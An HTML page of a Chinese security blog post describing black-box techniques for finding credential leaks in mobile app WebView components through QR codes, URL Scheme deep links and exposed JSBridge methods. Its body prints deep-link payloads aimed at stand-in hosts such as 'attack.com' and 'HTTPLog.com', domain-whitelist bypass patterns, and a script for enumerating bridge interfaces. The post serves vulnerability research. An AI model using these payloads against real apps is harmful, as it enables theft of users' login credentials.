<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>黑盒视角：探索 Webvie 组件漏洞面 · Chen's Blog</title> <meta name="description" content="黑盒视角：探索 Webvie 组件漏洞面"> <meta name="keywords" content="黑盒视角：探索 Webvie 组件漏洞面"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2025-12-26/1"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> <script> window.giscusThemeConfig = { light: "light_protanopia", dark: "dark_tritanopia" }; </script> <script src="/assets/js/theme.js"></script> </head> <body> <button class="theme-toggle" id="themeToggle" aria-label="Switch Theme"> <!-- 太阳图标 (在深色模式显示) --> <svg id="icon-sun" viewBox="0 0 24 24"> <path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zM2 13h2c.55 0 1-.45 1-1s-.45-1-1-1H2c-.55 0-1 .45-1 1s.45 1 1 1zm18 0h2c.55 0 1-.45 1-1s-.45-1-1-1h-2c-.55 0-1 .45-1 1s.45 1 1 1zM11 2v2c0 .55.45 1 1 1s1-.45 1-1V2c0-.55-.45-1-1-1s-1 .45-1 1zm0 18v2c0 .55.45 1 1 1s1-.45 1-1v-2c0-.55-.45-1-1-1s-1 .45-1 1zM5.99 4.58c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0s.39-1.03 0-1.41L5.99 4.58zm12.37 12.37c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0 .39-.39.39-1.03 0-1.41l-1.06-1.06zm1.06-10.96c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06zM7.05 18.36c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06z" /> </svg> <!-- 月亮图标 (在亮色模式显示) --> <svg id="icon-moon" viewBox="0 0 24 24" style="display: none"> <path d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.16,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.06,6.83,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z" /> </svg> </button> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">EvilChen</h1> <div class="divider"></div> <center> <a href="https://github.com/gh0stkey" target="_blank">Github</a> | <a href="https://twitter.com/VulkeyChen" target="_blank">X (Twitter)</a> | <a href="/about" target="_blank">About</a> | <a href="/friends" target="_blank">Friends</a> </center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">黑盒视角：探索 Webvie 组件漏洞面</h1> <time class="code">December 26, 2025</time> </div> <div class="divider"></div> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&auto=1&id=2600493765&height=66"></iframe> <h1 id="黑盒视角探索-webvie-组件漏洞面">黑盒视角：探索 Webvie 组件漏洞面</h1> <h2 id="前言">前言</h2> <p>本文主要记录了在移动端探索 WebView 组件漏洞的过程，采用黑盒视角，摒弃复杂繁琐的内部逻辑分析，专注于快速且直接的漏洞挖掘方法。由于笔者才疏学浅，因此本文难免会出现一些文笔不通或专业解释不到位的情况，还望多包涵及斧正。</p> <h2 id="webview-组件">WebView 组件</h2> <h3 id="介绍">介绍</h3> <p>顾名思义，WebView 组件是用于在应用程序中嵌入和展示 Web 内容的系统组件。通过调用 WebView，开发者能够实现在自己的应用中直接渲染网页，这从某种程度上极大地简化了跨平台应用的开发流程。利用 WebView，开发者只需进行少量适配工作，即可将现有的 Web 应用无缝移植到移动应用环境中，显著提升了开发效率和灵活性。</p> <h3 id="场景">场景</h3> <p>WebView 组件实际上无处不在。例如，在手机上打开一个商城 APP 时，展示的商品信息可能本质上就是通过 WebView 加载和渲染的网页。在这些实际应用场景中，用户通常不会察觉到 WebView 的存在，并且所有显示的信息可能都是由 APP 预先配置好的。</p> <h2 id="漏洞入口">漏洞入口</h2> <p>要想让用户手机上的 APP 调用 WebView 组件对自定义页面进行渲染，方法主要分为两种：<strong>第一类是国内常见的二维码扫码，通过扫描一个指向网页链接的二维码，从而直接调用 WebView 加载特定网页；第二类是 APP 间的跳转调用，即 URL Scheme（在安卓上也称为 Deep Link），通过这种方式可以从一个 APP 直接跳转到另一个 APP 中的特定页面，而这个页面同样可能是通过 WebView 来渲染的。</strong></p> <h3 id="二维码扫描">二维码扫描</h3> <p>APP 上的二维码扫码功能通常作用于用户界面的左右上角，如果找不到的话则可以在 APP 的设置页面中找到“扫一扫”、“扫码”等字眼就可以打开相关功能。</p> <p><img src="/images/2025-12-26/0.jpg" alt="" /></p> <h3 id="url-scheme-跳转">URL Scheme 跳转</h3> <p>关于 URL Scheme，对于我来说就是老熟人了，在 2018 年的时候就在博客里浅浅的分享了一下，有兴趣可以看下：https://gh0st.cn/archives/2018-12-08/1。</p> <p>这里简单说明下，URL Scheme 实际上是应用程序在操作系统层面注册的一种自定义协议格式，它允许 APP 定义特定的协议名，并在 APP 内定义路由和接收参数来完成某些功能，与我们所理解的 HTTP 协议形式的 URL 地址没有什么本质区别。当其他应用或浏览器尝试通过这种自定义协议发起请求时，系统能够识别并定位到相应的应用程序，然后传递所访问的功能路由和参数信息给该应用进行处理。</p> <p>在 iOS 和 Android 上，对于 URL Scheme 的支持是不一样的，例如在 iOS 上的 Safari 浏览器的地址栏中直接输入 URL Scheme 则可以完成跳转调用。而 Android 默认浏览器下，用同样的方式则会提示找不到网页，因此想要调用 URL Scheme 就需要借助 JavaScript（location 跳转）或 HTML（a 标签 href 点击指向）的方式，在 iOS 上也可以用这种方式。</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"xapp://page?url=https://gh0st.cn"</span><span class="nt">&gt;</span>Click<span class="nt">&lt;/a&gt;</span>
</code></pre></div></div> <p><img src="/images/2025-12-26/1.jpg" alt="" /></p> <h2 id="实战案例">实战案例</h2> <p>基于以上所述的两种攻击入口，我发现了许多 APP 上的漏洞，可以通过 WebView 组件直接获取用户凭证。</p> <h3 id="webview-访问">WebView 访问</h3> <p>访问获取凭证是 WebView 组件漏洞面的最基本漏洞，通过扫描二维码或 URL Scheme 跳转调用 WebView 组件打开指定的 URL 地址，接着由于 APP 为设限或存在绕过的情况下，WebView 内访问指定的 URL 地址时会携带凭证信息。</p> <p><strong>为什么 WebView 内访问可以携带凭证？</strong> 因为当前 APP 的设计架构采用 Native UI 与 WebView 相结合的方式，以兼顾性能体验与业务灵活性，支持更丰富的应用场景，因此在 APP 上进行登录后，APP 在 WebView 的应用场景下也会携带登录凭证。</p> <h4 id="二维码扫描-1">二维码扫描</h4> <p>关于二维码扫描的方式比较简单找到入口，如上文所说在 APP 那找到对应功能点即可。以下图所示，图中所展示的案例就是最经典的二维码扫描入口进入 WebView 组件，访问时携带了凭证到达指定 URL 地址。（可以将 URL 地址设为 BurpSuite Collaborator 的地址或类似有 HTTP Log 记录的地址）</p> <p>如图所示案例实际上有个细节，如二维码内容处打码的部分即为白名单域名，可以通过抓包或知道 APP 归属的域名方式获取该部分。很多 APP 使用 WebView 组件进行访问时，会判断当前访问的页面 URL 地址中的域名部分，有些 APP 在此处判断时比较宽松，例如判断域名是否包含某域名。因此可以通过一些格式对此进行绕过，如：<code class="language-plaintext highlighter-rouge">http://白名单域名.HTTPLog.com</code>、<code class="language-plaintext highlighter-rouge">http://白名单域名@HTTPLog.com</code>。</p> <p><img src="/images/2025-12-26/2.jpg" alt="" /></p> <h4 id="url-scheme-跳转-1">URL Scheme 跳转</h4> <p>URL Scheme 按常规逻辑需要通过工具查看 APP 所声明的信息，APK 格式就是文件内的 <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code> 文件，IPA 格式就是文件内的 <code class="language-plaintext highlighter-rouge">Info.plist</code> 文件。但是本文不做偏逆向/白盒侧的分享，从黑盒角度出发获取 URL Scheme。</p> <p><strong>为什么可以从黑盒出发获取 URL Scheme？</strong> 还是回到 Native UI 与 WebView，因为 WebView 会去访问一些业务/功能页面，因此开发也会在 WebView 网站中去写入 APP 的 URL Scheme 信息，从而调起 APP 内的一些 Native 功能，因此只要可以进行抓包即可通过正则匹配的方式获取到完整的 URL Scheme 信息。</p> <p>如下图所示案例逻辑为：</p> <ol> <li>通过笔者所开发的 HaE 工具配合 BurpSuite 进行抓包，规则就会获取到抓包过程中所出现的 URL Scheme 信息：<code class="language-plaintext highlighter-rouge">xxx://clause/WebView?url=</code>。</li> <li>得到该信息之后，将其中的 url 参数设为 HTTPLog 地址：<code class="language-plaintext highlighter-rouge">xxx://clause/WebView?url=http://HTTPLog.com</code>。</li> <li>在 iOS 环境下即可通过浏览器复制构建好的地址直接打开然后跳转到 APP 内的 WebView 访问界面。在 Android 环境下，则可以按上文中提到的 HTML 代码方式进行。</li> <li>最后在 HTTPLog 服务中即可查看是否获取到了凭证信息，如果没有也可以尝试绕过，与二维码扫描处的绕过逻辑是一样的。</li> </ol> <p><img src="/images/2025-12-26/3.jpg" alt="" /></p> <h3 id="jsbridge-获取">JSBridge 获取</h3> <h4 id="逻辑与发现">逻辑与发现</h4> <p>JSBridge 是一种在 App 中实现 JavaScript 与 Native 代码通信的技术方式，可以将 Web 页面中的 JavaScript 调用映射到原生功能中。很多 APP 在使用 JSBridge 映射 JavaScript 与 Native 方法时，未对调用来源的域（Origin）进行校验或白名单限制，导致任意网页或第三方脚本均可通过 JavaScript 直接调用注册的 Native 接口。</p> <p>这些被注册的接口，可以是全局变量、方法、对象等类型。在 JavaScript 中全局实际上就是窗口对象 Window。也就意味着这些接口都会被注册到 Window 下面。因此，只要进入到 WebView 组件内就可以通过遍历 Window 全局对象的方式来找到被 APP 所注册的接口。</p> <p>如下代码所示就是一个简易的 Window 全局对象遍历代码。它的缺点很明显，如图所示会将浏览器/组件自带的一些方法遍历出来，因此就需要加入输出过滤功能，从而帮助我们更方便的进行 APP 注册接口的寻找。</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nb">window</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">key</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="s2">`&lt;pre&gt;</span><span class="p">${</span><span class="nx">key</span><span class="p">}</span><span class="s2">:</span><span class="p">${</span><span class="nb">window</span><span class="p">[</span><span class="nx">key</span><span class="p">]}</span><span class="s2">&lt;/pre&gt;`</span><span class="p">;</span> <span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div> <h4 id="凭证获取">凭证获取</h4> <p>依旧使用 HaE 的规则通过抓包的方式来获取到 WebView 的 URL Scheme 信息：<code class="language-plaintext highlighter-rouge">xxx://promotion/web</code>，有些 URL Scheme 信息需要分析业务 JavaScript 文件中的逻辑，如图所示在基础的 URL 信息上还有一个参数 <code class="language-plaintext highlighter-rouge">url</code>：<code class="language-plaintext highlighter-rouge">xxx://promotion/web?url=</code>。</p> <p><img src="/images/2025-12-26/4.png" alt="" /></p> <p>如下图所示案例逻辑为：</p> <ol> <li>编写 A 标签跳转页面，用于指定 WebView 组件跳转页面：<code class="language-plaintext highlighter-rouge">&lt;a href="xxx://promotion/web?url=http://可信域名.attack.com/WebView/0.html"&gt;Click Me&lt;/a&gt;</code>。</li> <li>打开跳转页面点击 A 标签，调用起目标 APP 的 WebView 组件访问自动化遍历脚本页面，分析发现 <code class="language-plaintext highlighter-rouge">czbInfo.getAppInfo</code> 方法可以获取凭证。</li> <li>构建 JavaScript 外带代码用于验证凭证可以经过网络进行远程获取。</li> </ol> <p><img src="/images/2025-12-26/5.png" alt="" />)</p> <h2 id="总结与思考">总结与思考</h2> <p>本文从黑盒测试的视角，梳理了针对移动端 WebView 组件的漏洞挖掘路径。但是 WebView 组件不仅仅是移动端的特有产物，随着类 CEF （Chromium嵌入式框架）/ 类 Electron 框架的出现，PC客户端也同样面临着 WebView 组件攻击风险。</p> <p>抛出两个思考：除了获取凭证外是否存在其他更高维度的利用面？除了APP自身校验缺陷外是否存在系统层的校验不严格问题？</p> </article> <div class="page-navigation code"> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2023-12-18/1" title="PREV: 被忽视的暗面：客户端应用漏洞挖掘之旅">&gt;&gt;</a> </div> <div class="comments"> <div id="giscus-container" class="giscus"></div> <script> (function() { const getTheme = () => { try { const savedTheme = localStorage.getItem('theme'); if (savedTheme) { return savedTheme; } } catch (e) {} if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) { return 'dark'; } const hour = new Date().getHours(); return (hour >= 6 && hour < 18) ? 'light' : 'dark'; }; const theme = getTheme(); const giscusTheme = theme === 'dark' ? 'dark_tritanopia' : 'light_protanopia'; const script = document.createElement('script'); script.src = "https://giscus.app/client.js"; script.setAttribute("data-repo", "gh0stkey/gh0stkey.github.io"); script.setAttribute("data-repo-id", "MDEwOlJlcG9zaXRvcnkzODc5NzEyMzU="); script.setAttribute("data-category", "Announcements"); script.setAttribute("data-category-id", "DIC_kwDOFx_4o84CyCUA"); script.setAttribute("data-mapping", "title"); script.setAttribute("data-strict", "0"); script.setAttribute("data-reactions-enabled", "0"); script.setAttribute("data-emit-metadata", "0"); script.setAttribute("data-input-position", "top"); script.setAttribute("data-lang", "zh-CN"); script.setAttribute("data-theme", giscusTheme); script.setAttribute("crossorigin", "anonymous"); script.async = true; document.getElementById('giscus-container').appendChild(script); })(); </script> </div> </div> <div class="footer"> <span class="block">&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); $(".block").html("&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-" + (new Date()).getFullYear()); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
